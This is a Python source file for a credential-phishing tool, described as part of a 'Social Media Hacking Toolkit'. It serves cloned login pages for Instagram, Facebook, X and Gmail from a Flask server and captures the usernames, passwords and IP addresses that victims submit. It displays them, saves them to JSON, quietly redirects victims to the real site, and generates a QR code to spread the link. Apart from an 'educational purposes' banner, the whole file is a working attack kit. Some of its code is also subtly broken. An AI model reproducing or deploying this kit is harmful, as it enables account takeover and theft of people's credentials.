#!/usr/bin/env python3
"""
Phishing Tool Module for Social Media Hacking Toolkit
Provides phishing functionality for Instagram, Facebook, Twitter, and Gmail
"""

import os
import sys
import time
import json
import random
import threading
from datetime import datetime
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn
from rich.prompt import Prompt, Confirm
from rich.text import Text
import requests
from flask import Flask, render_template_string, request, redirect, url_for, session
from werkzeug.serving import make_server
import qrcode
from PIL import Image
import base64
from io import BytesIO

console = Console()

class PhishingTool:
    def __init__(self):
        self.app = Flask(__name__)
        self.app.secret_key = os.urandom(24)
        self.server = None
        self.port = 8080
        self.credentials = []
        self.templates = {
            'instagram': self.get_instagram_template(),
            'facebook': self.get_facebook_template(),
            'twitter': self.get_twitter_template(),
            'gmail': self.get_gmail_template()
        }
        self.setup_routes()
    
    def setup_routes(self):
        @self.app.route('/')
        def index():
            return self.render_phishing_page()
        
        @self.app.route('/login', methods=['POST'])
        def login():
            return self.handle_login()
        
        @self.app.route('/success')
        def success():
            return self.render_success_page()
        
        @self.app.route('/qr')
        def qr_code():
            return self.generate_qr_code()
    
    def get_instagram_template(self):
        return """
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Instagram • Log in</title>
            <style>
                * { margin: 0; padding: 0; box-sizing: border-box; }
                body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background: #fafafa; }
                .container { max-width: 350px; margin: 60px auto; padding: 20px; }
                .login-box { background: white; border: 1px solid #dbdbdb; border-radius: 1px; padding: 20px; }
                .logo { text-align: center; margin-bottom: 24px; }
                .logo img { width: 175px; }
                .form-group { margin-bottom: 6px; }
                .form-control { width: 100%; padding: 9px 0 7px 8px; border: 1px solid #dbdbdb; border-radius: 3px; font-size: 12px; }
                .btn { width: 100%; background: #0095f6; color: white; border: none; padding: 5px 9px; border-radius: 4px; font-weight: 600; cursor: pointer; }
                .btn:disabled { opacity: 0.3; }
                .divider { margin: 10px 0; text-align: center; color: #8e8e8e; font-size: 13px; }
                .footer { text-align: center; margin-top: 20px; color: #8e8e8e; font-size: 12px; }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="login-box">
                    <div class="logo">
                        <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTc1IiBoZWlnaHQ9IjcwIiB2aWV3Qm94PSIwIDAgMTc1IDcwIiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgo8cGF0aCBkPSJNMTQ5LjM0NyA0NC4xNDdDMTQ5LjM0NyA0OS4xNDcgMTQ1LjM0NyA1My4xNDcgMTQwLjM0NyA1My4xNDdIMzQuNjUzQzI5LjY1MyA1My4xNDcgMjUuNjUzIDQ5LjE0NyAyNS42NTMgNDQuMTQ3VjI1Ljg1M0MyNS42NTMgMjAuODUzIDI5LjY1MyAxNi44NTMgMzQuNjUzIDE2Ljg1M0gxNDAuMzQ3QzE0NS4zNDcgMTYuODUzIDE0OS4zNDcgMjAuODUzIDE0OS4zNDcgMjUuODUzVjQ0LjE0N1oiIGZpbGw9IiMwMDAiLz4KPHBhdGggZD0iTTg3LjUgMzQuNzVDOTQuNDA0IDM0Ljc1IDEwMC4wMDAgMjkuMTU0IDEwMC4wMDAgMjIuMjVDMTAwLjAwMCAxNS4zNDYgOTQuNDA0IDkuNzUgODcuNSA5Ljc1QzgwLjU5NiA5Ljc1IDc1IDE1LjM0NiA3NSAyMi4yNUM3NSAyOS4xNTQgODAuNTk2IDM0Ljc1IDg3LjUgMzQuNzVaIiBmaWxsPSIjMDAwIi8+CjxwYXRoIGQ9Ik0xMjUuMDAwIDI2LjI1QzEyNS4wMDAgMjQuNTU5IDEyMy42OTIgMjMuMjUgMTIyLjAwMCAyMy4yNUgxMTUuMDAwQzExMy4zMDggMjMuMjUgMTEyLjAwMCAyNC41NTkgMTEyLjAwMCAyNi4yNVYyOC4yNUMxMTIuMDAwIDI5Ljk0MSAxMTMuMzA4IDMxLjI1IDExNS4wMDAgMzEuMjVIMTIyLjAwMEMxMjMuNjkyIDMxLjI1IDEyNS4wMDAgMjkuOTQxIDEyNS4wMDAgMjguMjVWMjYuMjVaIiBmaWxsPSIjMDAwIi8+Cjwvc3ZnPgo=" alt="Instagram">
                    </div>
                    <form method="POST" action="/login">
                        <div class="form-group">
                            <input type="text" name="username" class="form-control" placeholder="Phone number, username, or email" required>
                        </div>
                        <div class="form-group">
                            <input type="password" name="password" class="form-control" placeholder="Password" required>
                        </div>
                        <button type="submit" class="btn">Log In</button>
                    </form>
                    <div class="divider">OR</div>
                    <div style="text-align: center;">
                        <a href="#" style="color: #00376b; text-decoration: none; font-size: 12px;">Log in with Facebook</a>
                    </div>
                    <div class="footer">
                        <p>Don't have an account? <a href="#" style="color: #00376b; text-decoration: none;">Sign up</a></p>
                        <p style="margin-top: 20px;">
                            <a href="#" style="color: #8e8e8e; text-decoration: none; margin: 0 8px;">Meta</a>
                            <a href="#" style="color: #8e8e8e; text-decoration: none; margin: 0 8px;">About</a>
                            <a href="#" style="color: #8e8e8e; text-decoration: none; margin: 0 8px;">Blog</a>
                            <a href="#" style="color: #8e8e8e; text-decoration: none; margin: 0 8px;">Jobs</a>
                        </p>
                    </div>
                </div>
            </div>
        </body>
        </html>
        """
    
    def get_facebook_template(self):
        return """
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Facebook - Log In or Sign Up</title>
            <style>
                * { margin: 0; padding: 0; box-sizing: border-box; }
                body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background: #f0f2f5; }
                .container { max-width: 980px; margin: 0 auto; padding: 20px; display: flex; align-items: center; min-height: 100vh; }
                .left-section { flex: 1; padding-right: 32px; }
                .right-section { flex: 1; }
                .logo { color: #1877f2; font-size: 4rem; font-weight: bold; margin-bottom: 0; }
                .tagline { font-size: 28px; line-height: 32px; margin-bottom: 20px; }
                .login-box { background: white; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,.1), 0 8px 16px rgba(0,0,0,.1); padding: 20px; }
                .form-group { margin-bottom: 12px; }
                .form-control { width: 100%; padding: 14px 16px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; }
                .btn { width: 100%; background: #1877f2; color: white; border: none; padding: 12px; border-radius: 6px; font-size: 20px; font-weight: bold; cursor: pointer; }
                .btn:hover { background: #166fe5; }
                .forgot-link { text-align: center; margin: 16px 0; }
                .forgot-link a { color: #1877f2; text-decoration: none; font-size: 14px; }
                .divider { border-top: 1px solid #dadde1; margin: 20px 0; }
                .create-btn { width: 100%; background: #42b72a; color: white; border: none; padding: 12px; border-radius: 6px; font-size: 17px; font-weight: bold; cursor: pointer; }
                .create-btn:hover { background: #36a420; }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="left-section">
                    <div class="logo">facebook</div>
                    <div class="tagline">Facebook helps you connect and share with the people in your life.</div>
                </div>
                <div class="right-section">
                    <div class="login-box">
                        <form method="POST" action="/login">
                            <div class="form-group">
                                <input type="text" name="username" class="form-control" placeholder="Email address or phone number" required>
                            </div>
                            <div class="form-group">
                                <input type="password" name="password" class="form-control" placeholder="Password" required>
                            </div>
                            <button type="submit" class="btn">Log In</button>
                        </form>
                        <div class="forgot-link">
                            <a href="#">Forgotten password?</a>
                        </div>
                        <div class="divider"></div>
                        <button class="create-btn">Create New Account</button>
                    </div>
                    <div style="text-align: center; margin-top: 28px; font-size: 14px;">
                        <strong>Create a Page</strong> for a celebrity, brand or business.
                    </div>
                </div>
            </div>
        </body>
        </html>
        """
    
    def get_twitter_template(self):
        return """
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Twitter / X</title>
            <style>
                * { margin: 0; padding: 0; box-sizing: border-box; }
                body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background: #000; color: white; }
                .container { max-width: 600px; margin: 0 auto; padding: 20px; }
                .logo { text-align: center; margin: 40px 0; }
                .logo svg { width: 40px; height: 40px; }
                .login-box { background: #16181c; border: 1px solid #2f3336; border-radius: 16px; padding: 32px; }
                .title { font-size: 31px; font-weight: bold; margin-bottom: 32px; }
                .form-group { margin-bottom: 20px; }
                .form-control { width: 100%; background: transparent; border: 1px solid #2f3336; border-radius: 4px; padding: 16px; color: white; font-size: 16px; }
                .form-control:focus { outline: none; border-color: #1d9bf0; }
                .btn { width: 100%; background: #1d9bf0; color: white; border: none; padding: 16px; border-radius: 9999px; font-size: 16px; font-weight: bold; cursor: pointer; }
                .btn:hover { background: #1a8cd8; }
                .links { text-align: center; margin-top: 40px; }
                .links a { color: #1d9bf0; text-decoration: none; margin: 0 10px; }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="logo">
                    <svg viewBox="0 0 24 24" fill="currentColor">
                        <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/>
                    </svg>
                </div>
                <div class="login-box">
                    <div class="title">Sign in to X</div>
                    <form method="POST" action="/login">
                        <div class="form-group">
                            <input type="text" name="username" class="form-control" placeholder="Phone, email, or username" required>
                        </div>
                        <div class="form-group">
                            <input type="password" name="password" class="form-control" placeholder="Password" required>
                        </div>
                        <button type="submit" class="btn">Sign in</button>
                    </form>
                    <div class="links">
                        <a href="#">Forgot password?</a>
                        <a href="#">Sign up for X</a>
                    </div>
                </div>
            </div>
        </body>
        </html>
        """
    
    def get_gmail_template(self):
        return """
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Gmail</title>
            <style>
                * { margin: 0; padding: 0; box-sizing: border-box; }
                body { font-family: 'Google Sans', Roboto, Arial, sans-serif; background: #f1f3f4; }
                .container { max-width: 450px; margin: 100px auto; padding: 20px; }
                .login-box { background: white; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); padding: 48px 40px 36px; }
                .logo { text-align: center; margin-bottom: 24px; }
                .logo img { width: 75px; height: 75px; }
                .title { font-size: 24px; font-weight: 400; margin-bottom: 32px; text-align: center; }
                .subtitle { font-size: 16px; font-weight: 500; margin-bottom: 32px; text-align: center; }
                .form-group { margin-bottom: 24px; }
                .form-control { width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; }
                .form-control:focus { outline: none; border-color: #1a73e8; }
                .btn-container { display: flex; justify-content: space-between; align-items: center; margin-top: 32px; }
                .btn { background: #1a73e8; color: white; border: none; padding: 12px 24px; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; }
                .btn:hover { background: #1557b0; }
                .link { color: #1a73e8; text-decoration: none; font-size: 14px; font-weight: 500; }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="login-box">
                    <div class="logo">
                        <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNzUiIGhlaWdodD0iNzUiIHZpZXdCb3g9IjAgMCA3NSA3NSIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTM3LjUgMTVDMjQuNDYgMTUgMTQgMjUuNDYgMTQgMzguNVY0MS41QzE0IDU0LjU0IDI0LjQ2IDY1IDM3LjUgNjVIMzc1QzM4OC4wNCA2NSA0MCA1NC41NCA0MCA0MS41VjM4LjVDNDAgMjUuNDYgMzg4LjA0IDE1IDM3NSAxNUgzNy41WiIgZmlsbD0iI0YxRjNGNCIvPgo8cGF0aCBkPSJNMzcuNSAyNUMyOS4wNCAyNSAyMiAzMi4wNCAyMiA0MC41VjQzLjVDMjIgNTEuOTYgMjkuMDQgNTkgMzcuNSA1OUgzNzVDMzgzLjQ2IDU5IDM5MCA1MS45NiAzOTAgNDMuNVY0MC41QzM5MCAzMi4wNCAzODMuNDYgMjUgMzc1IDI1SDM3LjVaIiBmaWxsPSIjRkZGRkZGIi8+CjxwYXRoIGQ9Ik0zNy41IDM1QzMxLjY5IDM1IDI3IDM5LjY5IDI3IDQ1LjVWNDguNUMzNyA1NC41IDQ3LjUgNjAgNTcuNSA2MEg0Ny41QzQxLjY5IDYwIDM3IDU1LjMxIDM3IDQ5LjVWNDYuNUMzNyA0MC42OSA0MS42OSAzNiA0Ny41IDM2SDM3LjVaIiBmaWxsPSIjRkZGRkZGIi8+Cjwvc3ZnPgo=" alt="Gmail">
                    </div>
                    <div class="title">Sign in</div>
                    <div class="subtitle">to continue to Gmail</div>
                    <form method="POST" action="/login">
                        <div class="form-group">
                            <input type="email" name="username" class="form-control" placeholder="Email or phone" required>
                        </div>
                        <div class="form-group">
                            <input type="password" name="password" class="form-control" placeholder="Enter your password" required>
                        </div>
                        <div class="btn-container">
                            <a href="#" class="link">Create account</a>
                            <button type="submit" class="btn">Next</button>
                        </div>
                    </form>
                </div>
            </div>
        </body>
        </html>
        """
    
    def render_phishing_page(self):
        platform = session.get('platform', 'instagram')
        return self.templates.get(platform, self.templates['instagram'])
    
    def handle_login(self):
        username = request.form.get('username', '')
        password = request.form.get('password', '')
        platform = session.get('platform', 'instagram')
        
        # Store credentials
        credential = {
            'platform': platform,
            'username': username,
            'password': password,
            'timestamp': datetime.now().isoformat(),
            'ip': request.remote_addr
        }
        self.credentials.append(credential)
        
        # Log the capture
        console.print(f"[green]✓[/green] Credentials captured: {username}@{platform}")
        
        # Redirect to success page
        return redirect(url_for('success'))
    
    def render_success_page(self):
        return """
        <!DOCTYPE html>
        <html>
        <head>
            <title>Success</title>
            <style>
                body { font-family: Arial, sans-serif; text-align: center; padding: 50px; background: #f0f0f0; }
                .success { background: white; padding: 40px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
                .check { color: #4CAF50; font-size: 48px; margin-bottom: 20px; }
            </style>
        </head>
        <body>
            <div class="success">
                <div class="check">✓</div>
                <h2>Login Successful!</h2>
                <p>You have been successfully logged in.</p>
                <p>Redirecting to your account...</p>
                <script>
                    setTimeout(function() {
                        window.location.href = 'https://www.instagram.com';
                    }, 2000);
                </script>
            </div>
        </body>
        </html>
        """
    
    def generate_qr_code(self):
        """Generate QR code for the phishing URL"""
        url = f"http://localhost:{self.port}"
        qr = qrcode.QRCode(version=1, box_size=10, border=5)
        qr.add_data(url)
        qr.make(fit=True)
        
        img = qr.make_image(fill_color="black", back_color="white")
        buffered = BytesIO()
        img.save(buffered, format="PNG")
        img_str = base64.b64encode(buffered.getvalue()).decode()
        
        return f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>QR Code</title>
            <style>
                body {{ font-family: Arial, sans-serif; text-align: center; padding: 50px; }}
                .qr-container {{ background: white; padding: 20px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); display: inline-block; }}
            </style>
        </head>
        <body>
            <div class="qr-container">
                <h3>Scan QR Code to Access</h3>
                <img src="data:image/png;base64,{img_str}" alt="QR Code">
                <p>URL: {url}</p>
            </div>
        </body>
        </html>
        """
    
    def start_server(self, platform='instagram'):
        """Start the phishing server"""
        session['platform'] = platform
        
        def run_server():
            self.server = make_server('0.0.0.0', self.port, self.app)
            self.server.serve_forever()
        
        server_thread = threading.Thread(target=run_server)
        server_thread.daemon = True
        server_thread.start()
        
        # Wait a moment for server to start
        time.sleep(1)
        
        return f"http://localhost:{self.port}"
    
    def stop_server(self):
        """Stop the phishing server"""
        if self.server:
            self.server.shutdown()
    
    def get_credentials(self):
        """Get captured credentials"""
        return self.credentials
    
    def clear_credentials(self):
        """Clear captured credentials"""
        self.credentials.clear()

def run_phishing_attack(platform='instagram'):
    """Main function to run phishing attack"""
    console.print(Panel.fit(
        "[bold blue]Phishing Tool[/bold blue]\n"
        f"[yellow]Platform:[/yellow] {platform.title()}\n"
        "[red]⚠️  Educational Purposes Only ⚠️[/red]",
        title="Social Media Hacking Toolkit"
    ))
    
    # Initialize phishing tool
    phisher = PhishingTool()
    
    try:
        # Start server
        url = phisher.start_server(platform)
        
        console.print(f"\n[green]✓[/green] Phishing server started successfully!")
        console.print(f"[blue]URL:[/blue] {url}")
        console.print(f"[blue]QR Code:[/blue] {url}/qr")
        
        # Create table for credentials
        table = Table(title="Captured Credentials")
        table.add_column("Platform", style="cyan")
        table.add_column("Username", style="magenta")
        table.add_column("Password", style="red")
        table.add_column("Timestamp", style="green")
        table.add_column("IP", style="yellow")
        
        console.print("\n[bold yellow]Waiting for credentials...[/bold yellow]")
        console.print("Press Ctrl+C to stop the attack\n")
        
        # Monitor for credentials
        while True:
            credentials = phisher.get_credentials()
            if credentials:
                # Clear console and show new credentials
                os.system('clear' if os.name == 'posix' else 'cls')
                console.print(Panel.fit(
                    "[bold blue]Phishing Tool[/bold blue]\n"
                    f"[yellow]Platform:[/yellow] {platform.title()}\n"
                    f"[green]Captured:[/green] {len(credentials)} credentials",
                    title="Social Media Hacking Toolkit"
                ))
                
                # Update table
                table = Table(title="Captured Credentials")
                table.add_column("Platform", style="cyan")
                table.add_column("Username", style="magenta")
                table.add_column("Password", style="red")
                table.add_column("Timestamp", style="green")
                table.add_column("IP", style="yellow")
                
                for cred in credentials:
                    table.add_row(
                        cred['platform'],
                        cred['username'],
                        cred['password'],
                        cred['timestamp'],
                        cred['ip']
                    )
                
                console.print(table)
                console.print(f"\n[blue]URL:[/blue] {url}")
                console.print(f"[blue]QR Code:[/blue] {url}/qr")
                console.print("\n[bold yellow]Waiting for more credentials...[/bold yellow]")
                console.print("Press Ctrl+C to stop the attack\n")
            
            time.sleep(1)
    
    except KeyboardInterrupt:
        console.print("\n[red]Stopping phishing attack...[/red]")
        phisher.stop_server()
        
        # Show final results
        credentials = phisher.get_credentials()
        if credentials:
            console.print(f"\n[green]✓[/green] Attack completed! Captured {len(credentials)} credentials:")
            
            final_table = Table(title="Final Results")
            final_table.add_column("Platform", style="cyan")
            final_table.add_column("Username", style="magenta")
            final_table.add_column("Password", style="red")
            final_table.add_column("Timestamp", style="green")
            final_table.add_column("IP", style="yellow")
            
            for cred in credentials:
                final_table.add_row(
                    cred['platform'],
                    cred['username'],
                    cred['password'],
                    cred['timestamp'],
                    cred['ip']
                )
            
            console.print(final_table)
            
            # Save to file
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"phishing_results_{platform}_{timestamp}.json"
            with open(filename, 'w') as f:
                json.dump(credentials, f, indent=2)
            
            console.print(f"\n[green]✓[/green] Results saved to: {filename}")
        else:
            console.print("\n[yellow]No credentials captured.[/yellow]")
    
    except Exception as e:
        console.print(f"\n[red]Error:[/red] {str(e)}")
        phisher.stop_server()

if __name__ == "__main__":
    # Test the phishing tool
    run_phishing_attack('instagram') 